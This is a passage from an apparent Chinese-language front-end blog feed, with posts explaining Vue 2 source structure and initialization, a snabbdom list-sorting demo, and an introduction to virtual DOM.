href="#平台无关与平台相关" class="headerlink" title="平台无关与平台相关"></a>平台无关与平台相关</h2><p>源码的<code>src</code>目录下有这样的结构</p><pre class=" language-js"><code class="language-js"><span class="token operator">|</span><span class="token operator">--</span>core<span class="token operator">|</span><span class="token operator">--</span>platforms      <span class="token operator">|</span><span class="token operator">--</span>web      <span class="token operator">|</span><span class="token operator">--</span>weex</code></pre><p>其中<code>core</code>存放的就是<strong>平台无关</strong>代码，<code>platforms</code>中存放的就是<strong>平台相关</strong>代码</p><p><strong>什么是平台无关性:</strong></p><ul><li>平台无关性就是一种语言在计算机上的运行不受平台的约束，一次编译，到处执行 。 </li></ul><p><strong>平台无关有两种：</strong></p><ul><li><p>源代码级和目标代码级。而C和C++具有一定程度的源代码级平台无关，表明用C或C++写的应用程序不用修改只需重新编译就可以在不同平台上运行。</p></li><li><p>而Java编译出来的是字节码，去到哪个平台都能用，只要有那个平台的JDK就可以运行，所以，Java程序的最大优势就是平台无关。</p></li></ul><h2 id="Vue的构造函数"><a href="#Vue的构造函数" class="headerlink" title="Vue的构造函数"></a>Vue的构造函数</h2><ul><li>src/platform/web中有一些<code>entry-</code>文件，引用了 ‘/runtime/index’</li><li><p>src/platform/web/runtime/index.js 中引用了 ‘core/index’</p></li><li><p>src/core/index.js</p><ul><li>定义了 Vue 的静态方法</li><li>initGlobalAPI(Vue)</li></ul></li><li><p>src/core/index.js 中引用了 ‘./instance/index’</p></li><li><p>src/core/instance/index.js</p><ul><li>定义了 Vue 的构造函数</li></ul></li></ul><pre class=" language-js"><code class="language-js"><span class="token keyword">function</span> Vue <span class="token punctuation">(</span>options<span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span>process<span class="token punctuation">.</span>env<span class="token punctuation">.</span>NODE_ENV <span class="token operator">!==</span> <span class="token string">'production'</span> <span class="token operator">&amp;&amp;</span>    <span class="token operator">!</span><span class="token punctuation">(</span><span class="token keyword">this</span> <span class="token keyword">instanceof</span> <span class="token class-name">Vue</span><span class="token punctuation">)</span>  <span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token function">warn</span><span class="token punctuation">(</span><span class="token string">'Vue is a constructor and should be called with the `new` keyword'</span><span class="token punctuation">)</span>  <span class="token punctuation">}</span>  <span class="token comment" spellcheck="true">// 调用 _init() 方法，在 initMixin 中定义</span>  <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">_init</span><span class="token punctuation">(</span>options<span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token keyword">export</span> <span class="token keyword">default</span> Vue</code></pre><h2 id="源码报错的两个小问题"><a href="#源码报错的两个小问题" class="headerlink" title="源码报错的两个小问题"></a>源码报错的两个小问题</h2><p>例如在<code>src/core/global/index.js</code>中会有报错</p><pre class=" language-js"><code class="language-js"><span class="token comment" spellcheck="true">// 例如此处不支持泛型会报错  </span>Vue<span class="token punctuation">.</span>observable <span class="token operator">=</span> <span class="token operator">&lt;</span>T<span class="token operator">></span><span class="token punctuation">(</span>obj<span class="token punctuation">:</span> T<span class="token punctuation">)</span><span class="token punctuation">:</span> T <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>    <span class="token function">observe</span><span class="token punctuation">(</span>obj<span class="token punctuation">)</span>    <span class="token keyword">return</span> obj  <span class="token punctuation">}</span><span class="token comment" spellcheck="true">// 而且这段代码之后的部分不会高亮显示</span></code></pre><p><strong>解决：文件 =&gt; 首选项 =&gt; 设置 =&gt; 右上角json格式</strong></p><pre class=" language-json"><code class="language-json">// 不检查 js 语法问题<span class="token property">"javascript.validate.enable"</span><span class="token operator">:</span> <span class="token boolean">false</span></code></pre><p>高亮显示：安装<code>Babel JavaScript</code>插件，但是之后的代码有些功能丢失了，不能跳转定义</p><h2 id="Vue初始化-静态成员"><a href="#Vue初始化-静态成员" class="headerlink" title="Vue初始化-静态成员"></a>Vue初始化-静态成员</h2><p>静态方法目录在：<code>src/core/global-api</code>中</p><p><strong>src/core/global-api/index.js</strong>：初始化 Vue 的静态方法</p><pre class=" language-js"><code class="language-js"><span class="token keyword">export</span> <span class="token keyword">function</span> initGlobalAPI <span class="token punctuation">(</span>Vue<span class="token punctuation">:</span> GlobalAPI<span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token comment" spellcheck="true">// src/core/global-api/index.js </span>  <span class="token comment" spellcheck="true">// 初始化 Vue.config 对象</span>  Object<span class="token punctuation">.</span><span class="token function">defineProperty</span><span class="token punctuation">(</span>Vue<span class="token punctuation">,</span> <span class="token string">'config'</span><span class="token punctuation">,</span> configDef<span class="token punctuation">)</span>  <span class="token comment" spellcheck="true">// exposed util methods.</span>  <span class="token comment" spellcheck="true">// NOTE: these are not considered part of the public API - avoid relying on</span>  <span class="token comment" spellcheck="true">// them unless you are aware of the risk.</span>  Vue<span class="token punctuation">.</span>util <span class="token operator">=</span> <span class="token punctuation">{</span>    warn<span class="token punctuation">,</span>    extend<span class="token punctuation">,</span>    mergeOptions<span class="token punctuation">,</span>    defineReactive  <span class="token punctuation">}</span>  <span class="token comment" spellcheck="true">// 静态方法 set/delete/nextTick</span>  Vue<span class="token punctuation">.</span><span class="token keyword">set</span> <span class="token operator">=</span> <span class="token keyword">set</span>  Vue<span class="token punctuation">.</span><span class="token keyword">delete</span> <span class="token operator">=</span> del  Vue<span class="token punctuation">.</span>nextTick <span class="token operator">=</span> nextTick  <span class="token comment" spellcheck="true">// 2.6 explicit observable API</span>  <span class="token comment" spellcheck="true">// 让一个对象可响应</span>  Vue<span class="token punctuation">.</span>observable <span class="token operator">=</span> <span class="token operator">&lt;</span>T<span class="token operator">></span><span class="token punctuation">(</span>obj<span class="token punctuation">:</span> T<span class="token punctuation">)</span><span class="token punctuation">:</span> T <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>    <span class="token function">observe</span><span class="token punctuation">(</span>obj<span class="token punctuation">)</span>    <span class="token keyword">return</span> obj  <span class="token punctuation">}</span>  <span class="token comment" spellcheck="true">// 初始化 Vue.options 对象，并给其扩展</span>  Vue<span class="token punctuation">.</span>options <span class="token operator">=</span> Object<span class="token punctuation">.</span><span class="token function">create</span><span class="token punctuation">(</span><span class="token keyword">null</span><span class="token punctuation">)</span>  ASSET_TYPES<span class="token punctuation">.</span><span class="token function">forEach</span><span class="token punctuation">(</span>type <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>    Vue<span class="token punctuation">.</span>options<span class="token punctuation">[</span>type <span class="token operator">+</span> <span class="token string">'s'</span><span class="token punctuation">]</span> <span class="token operator">=</span> Object<span class="token punctuation">.</span><span class="token function">create</span><span class="token punctuation">(</span><span class="token keyword">null</span><span class="token punctuation">)</span>  <span class="token punctuation">}</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true">// this is used to identify the "base" constructor to extend all plain-object</span>  <span class="token comment" spellcheck="true">// components with in Weex's multi-instance scenarios.</span>  Vue<span class="token punctuation">.</span>options<span class="token punctuation">.</span>_base <span class="token operator">=</span> Vue  <span class="token comment" spellcheck="true">// 设置 keep-alive 组件</span>  <span class="token function">extend</span><span class="token punctuation">(</span>Vue<span class="token punctuation">.</span>options<span class="token punctuation">.</span>components<span class="token punctuation">,</span> builtInComponents<span class="token punctuation">)</span>  <span class="token comment" spellcheck="true">// 注册 Vue.use() 用来注册插件</span>  <span class="token function">initUse</span><span class="token punctuation">(</span>Vue<span class="token punctuation">)</span>  <span class="token comment" spellcheck="true">// 注册 Vue.mixin() 实现混入</span>  <span class="token function">initMixin</span><span class="token punctuation">(</span>Vue<span class="token punctuation">)</span>  <span class="token comment" spellcheck="true">// 注册 Vue.extend() 基于传入的 options 返回一个组件的构造函数</span>  <span class="token function">initExtend</span><span class="token punctuation">(</span>Vue<span class="token punctuation">)</span>  <span class="token comment" spellcheck="true">// 注册 Vue.directive()、 Vue.component()、Vue.filter()</span>  <span class="token function">initAssetRegisters</span><span class="token punctuation">(</span>Vue<span class="token punctuation">)</span><span class="token punctuation">}</span></code></pre><p>上面所注册的全局API在<a href="https://cn.vuejs.org/v2/api/#%E5%85%A8%E5%B1%80-API" target="_blank" rel="noopener">官方文档中</a>。</p><p>关于Vue.directive可参考<a href="https://www.jianshu.com/p/13398358b5b4" target="_blank" rel="noopener">这篇博客</a>。</p><h2 id="Vue的实例属性和方法"><a href="#Vue的实例属性和方法" class="headerlink" title="Vue的实例属性和方法"></a>Vue的实例属性和方法</h2><p>定义实例属性和方法的目录在：<code>src/core/instance</code>中</p><p><strong>src/core/instance/index.js</strong>：定义Vue的构造函数和实例成员</p><pre class=" language-js"><code class="language-js"><span class="token keyword">function</span> Vue <span class="token punctuation">(</span>options<span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span>process<span class="token punctuation">.</span>env<span class="token punctuation">.</span>NODE_ENV <span class="token operator">!==</span> <span class="token string">'production'</span> <span class="token operator">&amp;&amp;</span>    <span class="token operator">!</span><span class="token punctuation">(</span><span class="token keyword">this</span> <span class="token keyword">instanceof</span> <span class="token class-name">Vue</span><span class="token punctuation">)</span>  <span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token function">warn</span><span class="token punctuation">(</span><span class="token string">'Vue is a constructor and should be called with the `new` keyword'</span><span class="token punctuation">)</span>  <span class="token punctuation">}</span>  <span class="token comment" spellcheck="true">// 调用 _init() 方法，在 initMixin 中定义</span>  <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">_init</span><span class="token punctuation">(</span>options<span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">// 下面这些方法都是在 Vue 的原型上增加属性,即实例上也可以调用</span><span class="token comment" spellcheck="true">// 注册 vm 的 _init() 方法，初始化 vm</span><span class="token function">initMixin</span><span class="token punctuation">(</span>Vue<span class="token punctuation">)</span><span class="token comment" spellcheck="true">// 注册 vm 的 $data/$props/$set/$delete/$watch</span><span class="token function">stateMixin</span><span class="token punctuation">(</span>Vue<span class="token punctuation">)</span><span class="token comment" spellcheck="true">// 初始化事件相关方法 $on/$once/$off/$emit</span><span class="token function">eventsMixin</span><span class="token punctuation">(</span>Vue<span class="token punctuation">)</span><span class="token comment" spellcheck="true">// 初始化生命周期相关的混入方法 _update/$forceUpdate/$destroy</span><span class="token function">lifecycleMixin</span><span class="token punctuation">(</span>Vue<span class="token punctuation">)</span><span class="token comment" spellcheck="true">// 混入 render $nextTick/_render</span><span class="token function">renderMixin</span><span class="token punctuation">(</span>Vue<span class="token punctuation">)</span><span class="token keyword">export</span> <span class="token keyword">default</span> Vue</code></pre>]]></content>
      
      
      <categories>
          
          <category> Vue </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>模拟实现snbbDom排行实例</title>
      <link href="2020/10/09/VirtualDOM-%E6%A8%A1%E6%8B%9F%E5%AE%9E%E7%8E%B0-snbbDom-%E6%8E%92%E8%A1%8C%E5%AE%9E%E4%BE%8B/"/>
      <url>2020/10/09/VirtualDOM-%E6%A8%A1%E6%8B%9F%E5%AE%9E%E7%8E%B0-snbbDom-%E6%8E%92%E8%A1%8C%E5%AE%9E%E4%BE%8B/</url>
      
        <content type="html"><![CDATA[<ul><li>官网示例：<a href="http://snabbdom.github.io/snabbdom/examples/reorder-animation/" target="_blank" rel="noopener">http://snabbdom.github.io/snabbdom/examples/reorder-animation/</a></li><li>代码地址：<a href="https://github.com/jinjingxuan/part3_module1_task/tree/master/code_3" target="_blank" rel="noopener">https://github.com/jinjingxuan/part3_module1_task/tree/master/code_3</a></li><li>构建工具 parcel</li></ul><h2 id="parcel"><a href="#parcel" class="headerlink" title="parcel"></a>parcel</h2><p>parcel 官网：<a href="https://zh.parceljs.org/getting_started.html" target="_blank" rel="noopener">https://zh.parceljs.org/getting_started.html</a></p><p>安装流程</p><pre class=" language-js"><code class="language-js">npm install <span class="token operator">-</span>g parcel<span class="token operator">-</span>bundler</code></pre><p>在你正在使用的项目目录下创建一个 package.json 文件：</p><pre><code>npm init -y</code></pre><p>Parcel 内置了一个当你改变文件时能够自动重新构建应用的开发服务器，而且为了实现快速开发，该开发服务器支持<a href="https://zh.parceljs.org/hmr.html" target="_blank" rel="noopener">热模块替换</a>。只需要在入口文件指出：</p><pre class=" language-js"><code class="language-js">parcel index<span class="token punctuation">.</span>html</code></pre><h2 id="安装-snabbdom"><a href="#安装-snabbdom" class="headerlink" title="安装 snabbdom"></a>安装 snabbdom</h2><pre class=" language-js"><code class="language-js">cnpm i <span class="token operator">-</span>D snabbdom</code></pre><h2 id="实现"><a href="#实现" class="headerlink" title="实现"></a>实现</h2><p>github地址：<a href="https://github.com/jinjingxuan/part3_module1_task/tree/master/code_3" target="_blank" rel="noopener">https://github.com/jinjingxuan/part3_module1_task/tree/master/code_3</a></p><ul><li>关键代码</li></ul><pre class=" language-js"><code class="language-js"><span class="token keyword">import</span> <span class="token punctuation">{</span> Data <span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">'./Data.js'</span><span class="token keyword">import</span> <span class="token punctuation">{</span> init <span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">"snabbdom/build/package/init"</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token punctuation">{</span> styleModule <span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">"snabbdom/build/package/modules/style"</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token punctuation">{</span> eventListenersModule <span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">"snabbdom/build/package/modules/eventlisteners"</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token punctuation">{</span> h <span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">"snabbdom/build/package/h"</span><span class="token punctuation">;</span><span class="token keyword">var</span> patch <span class="token operator">=</span> <span class="token function">init</span><span class="token punctuation">(</span><span class="token punctuation">[</span>styleModule<span class="token punctuation">,</span> eventListenersModule<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">var</span> container <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">"app"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">// title</span><span class="token keyword">var</span> title <span class="token operator">=</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">return</span> <span class="token function">h</span><span class="token punctuation">(</span><span class="token string">"h2"</span><span class="token punctuation">,</span> <span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token string">"Top 10 movies"</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">// list-item</span><span class="token keyword">var</span> item <span class="token operator">=</span> <span class="token keyword">function</span> <span class="token punctuation">(</span>itemIdx<span class="token punctuation">,</span> itemData<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">return</span> <span class="token function">h</span><span class="token punctuation">(</span><span class="token string">"li"</span><span class="token punctuation">,</span> <span class="token punctuation">{</span>         style<span class="token punctuation">:</span> <span class="token punctuation">{</span>             listStyle<span class="token punctuation">:</span> <span class="token string">"none"</span><span class="token punctuation">,</span>             display<span class="token punctuation">:</span> <span class="token string">"flex"</span><span class="token punctuation">,</span>            marginTop<span class="token punctuation">:</span> <span class="token string">"20px"</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token punctuation">[</span>        <span class="token function">h</span><span class="token punctuation">(</span><span class="token string">"div"</span><span class="token punctuation">,</span> <span class="token punctuation">{</span>            style<span class="token punctuation">:</span> <span class="token punctuation">{</span>                 width<span class="token punctuation">:</span> <span class="token string">"5%"</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span><span class="token punctuation">,</span> itemData<span class="token punctuation">.</span>rank<span class="token punctuation">)</span><span class="token punctuation">,</span>        <span class="token function">h</span><span class="token punctuation">(</span><span class="token string">"div"</span><span class="token punctuation">,</span> <span class="token punctuation">{</span>            style<span class="token punctuation">:</span> <span class="token punctuation">{</span>                 width<span class="token punctuation">:</span> <span class="token string">"30%"</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span><span class="token punctuation">,</span> itemData<span class="token punctuation">.</span>title<span class="token punctuation">)</span><span class="token punctuation">,</span>        <span class="token function">h</span><span class="token punctuation">(</span><span class="token string">"div"</span><span class="token punctuation">,</span> <span class="token punctuation">{</span>            style<span class="token punctuation">:</span> <span class="token punctuation">{</span>                 width<span class="token punctuation">:</span> <span class="token string">"65%"</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span><span class="token punctuation">,</span> itemData<span class="token punctuation">.</span>desc<span class="token punctuation">)</span>    <span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">// list</span><span class="token keyword">var</span> list <span class="token operator">=</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">let</span> items <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">let</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> Data<span class="token punctuation">.</span>length<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        items<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span><span class="token function">item</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span> Data<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> <span class="token function">h</span><span class="token punctuation">(</span><span class="token string">"ul"</span><span class="token punctuation">,</span> <span class="token punctuation">{</span>        style<span class="token punctuation">:</span> <span class="token punctuation">{</span>            padding<span class="token punctuation">:</span> <span class="token string">"0"</span><span class="token punctuation">,</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">,</span> items<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">// btns</span><span class="token keyword">var</span> btns <span class="token operator">=</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">return</span> <span class="token function">h</span><span class="token punctuation">(</span><span class="token string">"div"</span><span class="token punctuation">,</span> <span class="token punctuation">{</span> style<span class="token punctuation">:</span> <span class="token punctuation">{</span> float<span class="token punctuation">:</span> <span class="token string">"left"</span><span class="token punctuation">,</span> display<span class="token punctuation">:</span> <span class="token string">"flex"</span> <span class="token punctuation">}</span> <span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token punctuation">[</span>        <span class="token function">h</span><span class="token punctuation">(</span><span class="token string">"span"</span><span class="token punctuation">,</span> <span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token string">"Sort by:"</span><span class="token punctuation">)</span><span class="token punctuation">,</span>        <span class="token function">h</span><span class="token punctuation">(</span>            <span class="token string">"div"</span><span class="token punctuation">,</span>            <span class="token punctuation">{</span>                style<span class="token punctuation">:</span> <span class="token punctuation">{</span>                    marginLeft<span class="token punctuation">:</span> <span class="token string">"20px"</span>                <span class="token punctuation">}</span><span class="token punctuation">,</span>                on<span class="token punctuation">:</span> <span class="token punctuation">{</span>                    click<span class="token punctuation">:</span> sortByRank<span class="token punctuation">,</span>                <span class="token punctuation">}</span><span class="token punctuation">,</span>            <span class="token punctuation">}</span><span class="token punctuation">,</span>            <span class="token string">"Rank"</span>        <span class="token punctuation">)</span><span class="token punctuation">,</span>        <span class="token function">h</span><span class="token punctuation">(</span>            <span class="token string">"div"</span><span class="token punctuation">,</span>            <span class="token punctuation">{</span>                style<span class="token punctuation">:</span> <span class="token punctuation">{</span>                    marginLeft<span class="token punctuation">:</span> <span class="token string">"20px"</span>                <span class="token punctuation">}</span><span class="token punctuation">,</span>                on<span class="token punctuation">:</span> <span class="token punctuation">{</span>                    click<span class="token punctuation">:</span> sortByTitle<span class="token punctuation">,</span>                <span class="token punctuation">}</span><span class="token punctuation">,</span>            <span class="token punctuation">}</span><span class="token punctuation">,</span>            <span class="token string">"Title"</span>        <span class="token punctuation">)</span><span class="token punctuation">,</span>        <span class="token function">h</span><span class="token punctuation">(</span>            <span class="token string">"div"</span><span class="token punctuation">,</span>            <span class="token punctuation">{</span>                style<span class="token punctuation">:</span> <span class="token punctuation">{</span>                    marginLeft<span class="token punctuation">:</span> <span class="token string">"20px"</span>                <span class="token punctuation">}</span><span class="token punctuation">,</span>                on<span class="token punctuation">:</span> <span class="token punctuation">{</span>                    click<span class="token punctuation">:</span> sortByDes<span class="token punctuation">,</span>                <span class="token punctuation">}</span><span class="token punctuation">,</span>            <span class="token punctuation">}</span><span class="token punctuation">,</span>            <span class="token string">"Description"</span>        <span class="token punctuation">)</span><span class="token punctuation">,</span>    <span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">// clearBoth</span><span class="token keyword">var</span> clear <span class="token operator">=</span> <span class="token function">h</span><span class="token punctuation">(</span><span class="token string">"div"</span><span class="token punctuation">,</span> <span class="token punctuation">{</span> style<span class="token punctuation">:</span> <span class="token punctuation">{</span> clear<span class="token punctuation">:</span> <span class="token string">"both"</span> <span class="token punctuation">}</span> <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">// 主节点</span><span class="token keyword">var</span> pageNode <span class="token operator">=</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">return</span> <span class="token function">h</span><span class="token punctuation">(</span>        <span class="token string">"div#main"</span><span class="token punctuation">,</span>        <span class="token punctuation">{</span>            style<span class="token punctuation">:</span> <span class="token punctuation">{</span>                width<span class="token punctuation">:</span> <span class="token string">"800px"</span><span class="token punctuation">,</span>                paddingTop<span class="token punctuation">:</span> <span class="token string">"30px"</span><span class="token punctuation">,</span>                margin<span class="token punctuation">:</span> <span class="token string">"0 auto"</span><span class="token punctuation">,</span>            <span class="token punctuation">}</span><span class="token punctuation">,</span>        <span class="token punctuation">}</span><span class="token punctuation">,</span>        <span class="token punctuation">[</span><span class="token function">title</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">btns</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> clear<span class="token punctuation">,</span> <span class="token function">list</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">]</span>    <span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">// 首次渲染保存当前节点为老节点</span><span class="token keyword">var</span> oldPageNode <span class="token operator">=</span> <span class="token function">patch</span><span class="token punctuation">(</span>container<span class="token punctuation">,</span> <span class="token function">pageNode</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">// 刷新节点，并重新保存老节点</span><span class="token keyword">function</span> <span class="token function">updateNode</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    oldPageNode <span class="token operator">=</span> <span class="token function">patch</span><span class="token punctuation">(</span>oldPageNode<span class="token punctuation">,</span> <span class="token function">pageNode</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">function</span> <span class="token function">sortByRank</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    Data<span class="token punctuation">.</span><span class="token function">sort</span><span class="token punctuation">(</span><span class="token punctuation">(</span>a<span class="token punctuation">,</span> b<span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span>  a<span class="token punctuation">.</span>rank <span class="token operator">-</span> b<span class="token punctuation">.</span>rank <span class="token punctuation">)</span>    <span class="token function">updateNode</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">function</span> <span class="token function">sortByTitle</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    Data<span class="token punctuation">.</span><span class="token function">sort</span><span class="token punctuation">(</span><span class="token punctuation">(</span>a<span class="token punctuation">,</span> b<span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span>  a<span class="token punctuation">.</span>title<span class="token punctuation">.</span><span class="token function">localeCompare</span><span class="token punctuation">(</span>b<span class="token punctuation">.</span>title<span class="token punctuation">)</span> <span class="token punctuation">)</span>    <span class="token function">updateNode</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">function</span> <span class="token function">sortByDes</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    Data<span class="token punctuation">.</span><span class="token function">sort</span><span class="token punctuation">(</span><span class="token punctuation">(</span>a<span class="token punctuation">,</span> b<span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span>  a<span class="token punctuation">.</span>desc<span class="token punctuation">.</span><span class="token function">localeCompare</span><span class="token punctuation">(</span>b<span class="token punctuation">.</span>desc<span class="token punctuation">)</span> <span class="token punctuation">)</span>    <span class="token function">updateNode</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre>]]></content>
      
      
      <categories>
          
          <category> VirtualDOM </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Virtual DOM 与 Diff 算法</title>
      <link href="2020/09/24/VirtualDOM-VirtualDOM%E4%B8%8EDiff%E7%AE%97%E6%B3%95/"/>
      <url>2020/09/24/VirtualDOM-VirtualDOM%E4%B8%8EDiff%E7%AE%97%E6%B3%95/</url>
      
        <content type="html"><![CDATA[<ul><li>什么是虚拟DOM</li><li>使用 Snabbdom</li><li>源码解读<ul><li>h函数</li><li>VNode对象</li><li>init函数</li></ul></li><li>Diff 算法</li><li>v-for 带 key</li></ul><h2 id="什么是虚拟DOM"><a href="#什么是虚拟DOM" class="headerlink" title="什么是虚拟DOM"></a>什么是虚拟DOM</h2><ul><li>虚拟DOM是由普通的 JS 对象来描述 DOM 对象，因为不是真实的 DOM 对象，所以叫虚拟 DOM</li><li>创建虚拟 DOM 的开销比真实 DOM 小很多</li><li>虚拟 DOM 的好处是当状态改变时不需要立即更新 DOM，只需要一个虚拟树来描述 DOM，虚拟DOM内部将弄清楚如何有效（diff）的更新 DOM</li><li>如果每次更改应用程序状态都重新创建整个 DOM，则程序非常缓慢，而虚拟DOM可以跟踪上一次的状态</li><li><p>除了渲染 DOM 以外,还可以实现 SSR(Nuxt.js/Next.js),原生应用(Weex/React Native),小程序(mpvue/uni-app)</p></li><li><p>关于服务端渲染（SSR）可查看：</p><ul><li><a href="https://www.jianshu.com/p/b8cfa496b7ec" target="_blank" rel="noopener">https://www.jianshu.com/p/b8cfa496b7ec</a></li><li><a href="https://blog.csdn.net/github_34708151/article/details/98344114" target="_blank" rel="noopener">https://blog.csdn.net/github_34708151/article/details/98344114</a></li></ul></li></ul><h3 id="Virtual-DOM-库"><a href="#Virtual-DOM-库" class="headerlink" title="Virtual DOM 库"></a>Virtual DOM 库</h3><ul><li>Snabbdom<ul><li>Vue 2.x 内部使用的 Virtual DOM 就是改造的 Snabbom</li><li>大约 200 SLOC（single line of code）</li><li>通过模块可扩展</li><li>源码使用 TS 开发</li><li>最快的 Virtual DOM 之一</li></ul></li></ul><h2 id="使用-Snabbdom"><a href="#使用-Snabbdom" class="headerlink" title="使用 Snabbdom"></a>使用 Snabbdom</h2><ul><li>可以使用<code>parcel</code>构建工具，比较轻便</li></ul><pre class=" language-js"><code class="language-js">yarn add snabbdom</code></pre><ul><li>Snabbdom 官网 demo 中导入使用的是 common.js 模块化语法，我们使用 ES Modules 语法 import</li></ul><pre class=" language-js"><code class="language-js">require snabbdom <span class="token keyword">from</span> <span class="token string">'snabbdom'</span> <span class="token comment" spellcheck="true">// 导入所有函数</span><span class="token keyword">import</span> <span class="token punctuation">{</span> init<span class="token punctuation">,</span> h<span class="token punctuation">,</span> thunk <span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">'snabbdom'</span><span class="token comment" spellcheck="true">// 不使用 import snabbdom from 'snabbdom' 是因为</span><span class="token comment" spellcheck="true">// snabbdom.ts 末尾导出使用的语法是 export 导出，而没有使用 export default</span></code></pre><ul><li>init 是一个高阶函数，返回 patch()</li><li>h()返回虚拟结点 VNode，这个函数在Vue.js中见过</li></ul><pre class=" language-js"><code class="language-js"><span class="token keyword">new</span> <span class="token class-name">Vue</span><span class="token punctuation">(</span><span class="token punctuation">{</span>    router<span class="token punctuation">,</span>    store<span class="token punctuation">,</span>    render<span class="token punctuation">:</span> h <span class="token operator">=</span><span class="token operator">></span> <span class="token function">h</span><span class="token punctuation">(</span>App<span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">$mount</span><span class="token punctuation">(</span><span class="token string">'#app'</span><span class="token punctuation">)</span></code></pre><ul><li>thunk()是一种优化策略，可以在处理不可变数据时使用</li></ul><h3 id="如何使用"><a href="#如何使用" class="headerlink" 